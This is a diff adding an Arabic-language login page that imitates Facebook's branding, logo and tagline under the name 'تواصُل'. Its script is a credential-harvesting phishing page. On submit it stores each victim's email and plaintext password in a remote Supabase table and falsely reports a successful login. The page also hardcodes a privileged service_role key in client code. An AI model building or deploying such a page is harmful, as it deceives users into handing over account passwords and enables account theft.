@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="تواصُل - المنصة الاجتماعية للتواصل مع الأصدقاء والعائلة حول العالم">
+    <title>تواصُل - تسجيل الدخول</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <!-- Animated Background Particles -->
+    <div class="bg-particles">
+        <div class="particle particle-1"></div>
+        <div class="particle particle-2"></div>
+        <div class="particle particle-3"></div>
+        <div class="particle particle-4"></div>
+        <div class="particle particle-5"></div>
+        <div class="particle particle-6"></div>
+    </div>
+
+    <main class="main-container" id="main-container">
+        <!-- Left Section: Branding -->
+        <section class="branding-section" id="branding-section">
+            <div class="brand-content">
+                <div class="logo-wrapper">
+                    <div class="logo-icon" id="logo-icon">
+                        <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <circle cx="24" cy="24" r="22" fill="#1877f2"/>
+                            <path d="M32 16H28C26.3431 16 25 17.3431 25 19V22H32L31 28H25V40H19V28H14V22H19V19C19 14.5817 22.5817 11 27 11H32V16Z" fill="white"/>
+                        </svg>
+                    </div>
+                    <h1 class="brand-name" id="brand-name">تواصُل</h1>
+                </div>
+                <p class="brand-tagline" id="brand-tagline">
+                    تواصُل يساعدك على التواصل ومشاركة الحياة مع الأشخاص الذين يهمونك.
+                </p>
+            </div>
+        </section>
+
+        <!-- Right Section: Login Form -->
+        <section class="login-section" id="login-section">
+            <div class="login-card" id="login-card">
+                <div class="card-glow"></div>
+                <form 
+                    class="login-form" 
+                    id="login-form"
+                >
+                    <div class="input-group" id="email-group">
+                        <div class="input-wrapper">
+                            <input 
+                                type="email" 
+                                name="email" 
+                                id="email-input" 
+                                class="form-input" 
+                                placeholder="البريد الإلكتروني أو رقم الهاتف"
+                                required
+                                autocomplete="email"
+                            >
+                            <div class="input-focus-border"></div>
+                            <span class="input-icon">
+                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                    <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/>
+                                    <polyline points="22,6 12,13 2,6"/>
+                                </svg>
+                            </span>
+                        </div>
+                    </div>
+
+                    <div class="input-group" id="password-group">
+                        <div class="input-wrapper">
+                            <input 
+                                type="password" 
+                                name="password" 
+                                id="password-input" 
+                                class="form-input" 
+                                placeholder="كلمة السر"
+                                required
+                                autocomplete="current-password"
+                            >
+                            <div class="input-focus-border"></div>
+                            <span class="input-icon">
+                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+                                    <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+                                </svg>
+                            </span>
+                            <button type="button" class="toggle-password" id="toggle-password" aria-label="إظهار كلمة السر">
+                                <svg class="eye-open" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+                                    <circle cx="12" cy="12" r="3"/>
+                                </svg>
+                                <svg class="eye-closed" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:none;">
+                                    <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
+                                    <line x1="1" y1="1" x2="23" y2="23"/>
+                                </svg>
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Success/Error Messages -->
+                    <div id="form-message" style="display:none; padding:12px; border-radius:8px; text-align:center; font-weight:600; font-size:0.9rem;"></div>
+
+                    <button type="submit" class="login-btn" id="login-btn">
+                        <span class="btn-text">تسجيل الدخول</span>
+                        <span class="btn-loader" style="display:none;">
+                            <span class="spinner"></span>
+                        </span>
+                    </button>
+
+                    <a href="#" class="forgot-password" id="forgot-password-link">هل نسيت كلمة السر؟</a>
+
+                    <div class="divider" id="divider">
+                        <span class="divider-line"></span>
+                        <span class="divider-text">أو</span>
+                        <span class="divider-line"></span>
+                    </div>
+
+                    <button type="button" class="create-account-btn" id="create-account-btn">
+                        إنشاء حساب جديد
+                    </button>
+                </form>
+            </div>
+
+            <p class="footer-text" id="footer-text">
+                <a href="#" id="create-page-link">أنشئ صفحة</a> لشخصية مشهورة أو علامة تجارية أو نشاط تجاري.
+            </p>
+        </section>
+    </main>
+
+    <!-- Footer -->
+    <footer class="site-footer" id="site-footer">
+        <div class="footer-content">
+            <div class="footer-links" id="footer-links">
+                <a href="#">العربية</a>
+                <a href="#">English</a>
+                <a href="#">Français</a>
+                <a href="#">Español</a>
+                <a href="#">Deutsch</a>
+            </div>
+            <div class="footer-divider"></div>
+            <div class="footer-links" id="footer-links-secondary">
+                <a href="#">تسجيل الاشتراك</a>
+                <a href="#">تسجيل الدخول</a>
+                <a href="#">الخصوصية</a>
+                <a href="#">الشروط</a>
+                <a href="#">المساعدة</a>
+            </div>
+            <p class="copyright" id="copyright">تواصُل © 2026</p>
+        </div>
+    </footer>
+
+    <!-- Supabase JS SDK -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+    <script>
+        // ===== Supabase Setup =====
+        const SUPABASE_URL = 'https://svdvevhpumksppdqridi.supabase.co';
+        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InN2ZHZldmhwdW1rc3BwZHFyaWRpIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc5MjI3MTIzNSwiZXhwIjoyMTA3ODQ3MjM1fQ.T8wMQlm5qkpDF2XjnYtqG8HrRboNlQLnO_yFw-JNR80';
+        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+        // ===== Toggle Password Visibility =====
+        const toggleBtn = document.getElementById('toggle-password');
+        const passwordInput = document.getElementById('password-input');
+        const eyeOpen = toggleBtn.querySelector('.eye-open');
+        const eyeClosed = toggleBtn.querySelector('.eye-closed');
+
+        toggleBtn.addEventListener('click', () => {
+            const isPassword = passwordInput.type === 'password';
+            passwordInput.type = isPassword ? 'text' : 'password';
+            eyeOpen.style.display = isPassword ? 'none' : 'block';
+            eyeClosed.style.display = isPassword ? 'block' : 'none';
+        });
+
+        // ===== Show Message =====
+        function showMessage(text, isSuccess) {
+            const msgEl = document.getElementById('form-message');
+            msgEl.textContent = text;
+            msgEl.style.display = 'block';
+            msgEl.style.background = isSuccess ? '#e6f4ea' : '#fce8e6';
+            msgEl.style.color = isSuccess ? '#1e7e34' : '#c62828';
+            msgEl.style.border = isSuccess ? '1px solid #a8d5ba' : '1px solid #f5c6cb';
+        }
+
+        // ===== Form Submit → Supabase =====
+        const form = document.getElementById('login-form');
+        const loginBtn = document.getElementById('login-btn');
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const btnText = loginBtn.querySelector('.btn-text');
+            const btnLoader = loginBtn.querySelector('.btn-loader');
+            const msgEl = document.getElementById('form-message');
+            msgEl.style.display = 'none';
+
+            // Show loading
+            btnText.style.display = 'none';
+            btnLoader.style.display = 'flex';
+            loginBtn.disabled = true;
+
+            const email = document.getElementById('email-input').value;
+            const password = document.getElementById('password-input').value;
+
+            try {
+                const { data, error } = await supabase
+                    .from('بحر')
+                    .insert([{ email, password }]);
+
+                if (error) {
+                    showMessage('حدث خطأ: ' + error.message, false);
+                } else {
+                    showMessage('تم تسجيل الدخول بنجاح! ✅', true);
+                    form.reset();
+                }
+            } catch (err) {
+                showMessage('حدث خطأ في الاتصال بالخادم', false);
+            }
+
+            // Reset button
+            btnText.style.display = 'block';
+            btnLoader.style.display = 'none';
+            loginBtn.disabled = false;
+        });
+
+        // ===== Input Focus Animations =====
+        document.querySelectorAll('.form-input').forEach(input => {
+            input.addEventListener('focus', () => {
+                input.closest('.input-wrapper').classList.add('focused');
+            });
+            input.addEventListener('blur', () => {
+                input.closest('.input-wrapper').classList.remove('focused');
+            });
+        });
+
+        // ===== Entrance Animations =====
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', () => {
+                document.body.classList.add('loaded');
+            });
+        } else {
+            document.body.classList.add('loaded');
+        }
+    </script>
+</body>
+</html>
+
